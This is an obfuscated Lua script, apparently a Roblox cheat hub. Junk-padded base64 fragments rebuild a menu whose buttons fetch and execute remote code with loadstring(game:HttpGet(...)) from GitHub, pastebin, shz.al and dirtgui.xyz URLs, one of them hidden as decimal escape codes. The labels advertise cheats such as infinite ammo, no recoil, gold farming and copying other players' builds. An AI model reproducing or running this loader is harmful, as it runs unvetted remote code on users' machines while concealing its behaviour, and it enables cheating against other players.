SgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('kpAXHaCImmGdIhVvWJIwIScGbmMKDZkiXopnZLkwiIpjyLnbLjSqOnvgZtZhauWsmDlItqLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/XiaoYunCN/UWU/main/%E4%BA%91%E8%84%9A%E6%9C%ACEvade.luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('PPPifBXNJsrosalWgobrRQKRiAzNgUwFSTZcBFGydvUdSCwSrrZgUAVGhOEDYQeDjGiDDeKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')老外脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('pPTLQQDGEDJZQWMFdiMZVZTVjDgbdOmwBOdmVqzjQuEdIQAPgSgWpHgffAXpACnxiasrdOLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~jdjsjsKKtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('vFABSigLbqGvwqNytsgOPqPJNpwbbAliikerhsbIdvPZdyllmDvNidGJXJjOsLurtKnLGPKSkoKQ0KZW5kKQ0KDQpsb2NhbCBjcmVkcyA9IHdpbmRvdzpUYWIo')Fling Things and People脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('sDnQDWstaQhRUYQTtzIXvBfmSVcrOXzOuCWkVxbDimxHNxWyGPvwLpUHtcioYWfmtdcUQhLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('SkWPQCLKUZJCvwxgFSHUsGuNmUOQMoscGudIhcLXAoJsCSwJiEUOVvgnOhDPtCGtkcMlprKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')Fling Things and People脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('WBXTLgQDBCDaPQZpOlDrBzoRjqMcmnZdUpmrqJxVacnwoCyPMJRAFzqyYJidHXXOBzjpXSLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')Fling Things and People1tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('oZKxQLFcWIrrhzJqNHabESyetIwOObsUUfjtQZqcTUtkxALxWLYDpKwsmRaGKSLiAmgUEkLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/BlizTBr/scripts/main/FTAP.luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('rvqnnxyvAPlVQhCHXCTQNdppUDPXpCmBMrOpdOQBtiloZcpaJBeFdiPFHexBGbNjDgkSSmKSkoKQ0KZW5kKQ0KDQpsb2NhbCBjcmVkcyA9IHdpbmRvdzpUYWIo')国王遗产脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('sUwOJcrXBOYyqyoVyFNlERwRoMmuWfOaEKKUZENlnUNjlBzMVfKFdtItMzgpvamDlwASsTLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('aXLaWpjkMxnvkaPVornxfZmxiqvSXSBjrhoTpKOBnOWvOsUSjhsssyiZExLJDyIHptFqDqKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('CMjvPuromCiexFqMCwUAdXBdHfLidgHxSjdtubYWMBkhgWnSBdaHfMTdTwQXeSdQfUvTflLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')『1』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('UEflXFOHzUIZMlRQussHdahVjYvBBzbXsIjrMxjgLMxuIZszgKvgkPruxrIQazQIhiIKxnLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/sannin9000/scripts/main/kinglegacy.luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('RFyPohKMQJlLlFDooLCSWtJGetgmwdvfozIVAuzaNvJaAUbzRtFszfGvhYXTkdeMYpwmXYKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')『2』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('YcCsbrKPQxAfeykYBIypbghYYRhToekyvkuLMmaEDadEyUkirMDIqwdbBeukjMEqTgIJbsLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/1f0yt/community/master/legacytZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('qTJLcRHggZCswyEofwWwDiLRNFVtCqqMLjBuWLVKGUDmGfoQLHdGOoBxlRahBNKLlzklXyKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')『3』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('XhJmRMbJKwYtaXtaXcvpViQqRCsMStYgathLBrzFWdTJLTtqdXpCqWSoBFdbyhzVxCQtwsLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/hajibeza/RIPPER-HUB/main/King%20LeagacytZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('zZGFWGbSgHiJIBjzIvqFlJxpRFcoElbMNbzjPcNewrrBbAADVueXQWptAFMJYynvMEmpAIKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')『4』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('fOIxEjOHGWSYJXGEhQglWapCgtbhcTunmEPlroLhUgcDZSWMsqSJcEgmJxSiQoMGRXwNHnLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/Strikehubv2z/StormSKz/main/All_in_onetZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('MCSYqZVxBmYUktYnPkgagTiRBHLriCfbtmvCIWNgtDWqnyGDChGJmYSdvNgccsvbZsxwhHKSkoKQ0KZW5kKQ0KDQpsb2NhbCBjcmVkcyA9IHdpbmRvdzpUYWIo')披萨店脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('zCkMLDXFZfTfbLydaqdphLRmrkKasvonVYHaBGaAKspBBNkybJxECEyiFQoyKIyZcheGYqLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('yJSuZRzGCdzexsREUiLfSTuYjIpIPCElzVZuALdyShvvWgJZFjpEmaWVUwiLFfcOBVhcsfKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('rDlMcqfigNQzmzdUuBVpjDeuzfJIEjQKaeKkwivGFnMRXwmzREnrHmJBnfHAWArtpZDbbILHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')披萨点自动工作tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('XiCYpIIKOosLcdPgBKnGhCCYqmhQgSrigNMqoGISiAbZjFAatxfGmMXjxhDwjKuNRLPWYVLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~HHHSUSUtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('jkWwYpaPRNXPeOBHNgYkIZLAghfiqFxIPcnQtLSZGvNEaaSRcTwqIXEfUgglGsOfxIcyvjKSkoKQ0KZW5kKQ0KDQpsb2NhbCBjcmVkcyA9IHdpbmRvdzpUYWIo')Drive WorldtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('RRrAyoKeBSTUoRbBqvGwEkcdlFDPhWjymEKFqIbEmiNJSXWUDUwMnJmSzgWwpvGbqgHXjSLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('PqBuMFPApUdaMhVOJnwNdcVpqETjoEPrAZMmTgiJXVeIlWgBCaeqwYFzfygOxlHJuBZsXLKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('BQmXGfRmEokgfohbCbvxmvDSATAtTIEZrecpfuiMMhxqxsKwpnQsEHvLKScydArnRdbhmkLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')Drive World脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ulMrqLarrnFsjRQPvBeOZOOGaNDBipDMyMnkXqCMYzkCowtCBKryOdKOfErjcjcQDaCdfILGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/x3fall3nangel/FallAngelHub/main/DriveWorld.luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('DBZcCSxjRCBlIlTQouWGgxZENPwvWElAvGIqkQmwfYVuHMwGeAmILAXlLtpDVGJiTTTKKiKSkoKQ0KZW5kKQ0KDQpsb2NhbCBjcmVkcyA9IHdpbmRvdzpUYWIo')一路向西tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('tghEeGrGgFGkcaBhprMUwrBOlQLIimJGvaSxuFkObIqXruoPAOKszdmnmXhMQZZAaHKMKaLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('cMnTmfyaVRAACHCdBotJlrWbUeGcaSKtfSustQMDlkYDxFFtszknfvzYrTdQuXutKgtOadKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('RvtOLsMIUfBVJCfCyNEQvQcxcNLhmErgdCLnvBsIqXbJVJaCncopXKkwGRxoVuKfLSYbyOLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')一路向西（无后坐力超级射速无限子弹）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ZJpsFUodkwtMdATWNZBWhCMoyuClOKJCVHTQklTXdmjHpoUUQnfZCqRrUyXnlhvCLnuUAMLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6R2V0T2JqZWN0cyg=')rbxassetid://10040701935tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('bJmUCkSWlNrZkkPwtLgUGrOpNIPOpfepYAXLSmWtYZRybBkuDTZlaWNAoUPwecbuzfrrXYKVsxXS5Tb3VyY2UpKCkNCmVuZCkNCiAgICBjcmVkaXRzOkJ1dHRvbig=')一路向西（名字相同脚本不同）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('BNeUhABUoDmgZtCDxOGZNTYOwlWwkQyAjjpMjPqqYVAlSoIZjCQsXzBEfrHwwdeqvHncwlLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgo')https://raw.githubusercontent.com/Drifter0507/scripts/main/westboundtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('YByRdejYtUnutCsmmYWCZjrCEfbFKFFwLOIHaRzVOmrdGfNjlTCnuthNhRVIifzmkervxUKSx0cnVlKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')一路向西（名字相同脚本不同）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('AILjupgHrEfZlxfLZwyHIBSOZCNEttJHJZhYfbfMlVNcfHpPhoOWyUyujjnoEXyndRXeqWLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://pastefy.app/q08owYGG/rawtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('BCexuawVHVuhPjIHyaCoRaJstKzlXYzZyfUpwaeDbiZJIeQVSWRnGbsnauolSheTRJmTcUKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')剑客脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('VvfbTmbZqXzlRSXRiKxVzQbsCINPKKhXsTxWQJbffxKJXlFlTYauXZBDdWFlwUHtXFYNxTLGZ1bmN0aW9uKCkNCiAgICBqaWFua2VfVjQgPSA=')作者_初夏tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('VkDjUsoaeJYjKTEPeBovLolsUZAVpZGDkIvJxakWbMTvKUXBLSTaLWEzKALAVTrJQAwMyQamlhbmtlX19WNCA9IA==')作者QQ1412152634tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('QovxqfTtEHeCLNJJyvCBoBkaPiAYESSGftEUmpSVZtEQsLEauGOVWecrNvKmpwUjdBbapWamlhbmtlX19fVjQgPSA=')剑客QQ群347724155tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('QqLSwokZlzEGDARNAQHAEynqTJycDAguCrIDWISuvawLpQebzHYFIOZyjZFfuBHEUFGserbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoKA==')https://shz.al/~JianKeV4tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('uJRBRXIwbaMqzsevhbGIsFoWqnYksSMqONEALvutPmYncKBPiDikNGbEOtKNxtWwYecIduKSkpKCkNCmVuZCkNCg0KbG9jYWwgY3JlZHMgPSB3aW5kb3c6VGFiKA==').,.77寻宝tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('NhbEYnmgCUVKMHcivlKZafdFsQXnCBmsIDcdNKNfoqfnmSqjOaMAMPRnPqjCucEcbhvIqHLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('skmLHqXwKquDWaYyHRAHhtFeDEQamyWKMAfxLkUCQoJCGvuPEgWJhiHxNflbHEYUmPXCLZKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('LTwpuqKJrZoQIMiojUIqacXZIaReoqIFUQVdZOHAAQJaNHYRcIwUQiohkjTsHbpkgZzPPqLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')造船寻宝（名字相同脚本不同）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('wFCacOQjLgpKOmjOndsDxYxDONxkTIXOpgkVnNZeEmkrrPCVIMznoEvuOHlurQihWCwLIZLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')http://dirtgui.xyz/BuildABoat.luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('FTtetllIAGzkbVvIZdotGJAtrYAUEjebBCHwfNwuKxQVROBhWiamQCYVLDbfUBIeWHeqdtLHRydWUpKSgpDQplbmQpDQogICAgY3JlZGl0czpCdXR0b24o')造船寻宝（名字相同脚本不同）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('wflvanUlgfpZMdUBFFleNPfuDtHIpLFGnwHnghJLRmgqTrptOwXzYHyhahLnDDTRSaHbPjLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://pastefy.app/hvV1c4nO/rawtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('XaMRbrsIukTlpeFojYiQVJTquOrvoXdIAtKIhsQzlBnuzLHyTHyRaltMXJpzjdEyJhEennKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')造船寻宝（复制别人船）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('pPslbRmQRwynKNTQJjvsAMNqxOFxuqfLNsCcmgCsnQmhDMCSHOQZUvkOUTiKLubgRJjBOULGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/max2007killer/auto-build-not-limit/main/autobuild.txttZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('JhsyxpNDGBpWgcqDQLFDCUVPzimXmszMlKbSxrApzpwSULDfScjbVvhFtXbfVPuLmXNYdlKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')造船寻宝（刷钱）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('LZQOACilubqmrncnraStYAObdqOHgOzyGzRsXYnPvJmivwfbJSYCVDxpKreyNzkAPOXYFBLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgo')https://raw.githubusercontent.com/urmomjklol69/GoldFarmBabft/main/GoldFarm.luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('gJNjqKKNAtJgQGbvmzjJhHyXPvToKVYDFFyNrAwiEEUZkyYZouKmSwTljPQoSLRXAgoVvkKSx0cnVlKSkoKQ0KZW5kKQ0KDQpsb2NhbCBjcmVkcyA9IHdpbmRvdzpUYWIo')鲨口求生脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('gCjHeRvJwzabJqgQRWIrBkZXSYvVHRAPcpRYNgKydjXMchSWsQDMFWInRrdcXfRbCDBuuRLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('WPPiLHGMImwkQxJiOMxRQyDTwBLZBPuXBvvizHoirZDwYFCYYNvNxjUsbIMwDSlXNQYnklKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('UrQMkppOXkOZIBruXttHEEzibrcoqAEcwLKPVmUoPcxBrLgabaouTTIsUZInhLIaMYFugOLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')鲨口求生有一些功能慎用tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('lFfYyXYEXYsaJXPJlYPwskIMoqtJZRGsATEjDchJhKQdqzIcTuyqIKIQnhhxqChTEBrjIbLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://pastebin.com/raw/YYVLbzVgtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('rULylicGEJxeQowPXciDdJxOcXtGGAMCualiEIJfzrYjHUlaRAmUQOElTevdKYXKXpOdpcLCB0cnVlKSkoKQ0KZW5kKQ0KDQpsb2NhbCBjcmVkcyA9IHdpbmRvdzpUYWIo')DOORStZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('WZCCSqOyRLqbZgXJaMUmAKMCfYiAxKFCUOyVNwVrhwOWntyIwavSwoQuJYqxrEyJsDDOxpLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ITGjJgmhaLDGKkhbOiLdEwzKTGmwEGIYjWiOhJNeiVXHUvqIEddXzyNcudUhvkjHVKDRnYKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』（最强只是听说）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('DsdqdrbcOlpwlGcLCmjDPWdeXCPioRvXGWqHpIOzsGkdwXcfDruWXxnfLFXNwMkXtBNwQwLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')霖溺自制DoorstZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('AxgHFpuxzZBHhETmoKDWWrbtfwHzcUrEzMcjDHyZkIRAvEiVPAnxnMFBkPzqPNwNcNsACFLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/yWFFtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('NuFHHLPpoQimqnhILfhyuXwHIXCUCEytpXfPNwqJgQsRzPdERbaIDdUakPOAQSzAYgIzckKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')新doors脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('mkPOBUWIdNWORPrtTVYJHgRQknYluYZFPvhuSEOLLoaIQeAfMTsvjxMnWvOvrsCGJejBCOLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/KINGHUB01/BlackKing-obf/main/Doors%20Blackking%20And%20BobHubtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('SqGjGXDDkrCqyqICOagZotuCWaPzKEmUDlrFBjTUXAZaNSMHJFoijaYvhJhPVqoKQUaIVgKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')最强汉化DOORStZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('nYMPtzRUwqRtOaKPVSIFpHEcoOZepJAOFgQRWfixnqrHMPNohtvjLnzFTIgoLqNoHkPSvZLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\54\53\84\119\84\56\106\97tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('EruCosGvfuLmIULdIiYAOdSHkvRQBtbZPbdWSRvITwlOTVSDDmjZkQtywRpeKvqYclPWjnKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')DX汉化加二改tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('WXEpUYCwMYREVatZUNYabVsukJqktuNzklhzLnUTUaEfnCkVrspovIfvxlhJKFAvjnpqvYLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/DXuwu/replicator-lol/main/dor.luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('TLBRPaTowslrkyJVjcSaZoEYBmncHayRmQawOAqikkJbXJCNfDqwhdixfDJnOKmFSdsotXKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')多功能DOORStZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('SbJsHBfoxlUObeYmhnvvENfYHdXnGKBZhwnNSHXlBjnkvqRgZXCawmQeHUTwzggNrhdVkBLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~SJZJJSISItZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('CsBygQRtMhYApiuGSzfdePtkpgSoMDpCMjFAcLfsohujJnNjnHaSjSmSJJhcNrRyjSnVSiKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')微山DOORStZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('UlVTaJyVorSBrkHbwAwLhUeDrfKnvRJgFsiASiNWSKBqTLtbmikfDegFAxpxnXgSCAMIdrLGZ1bmN0aW9uKCkNCiAgICBsb2Fk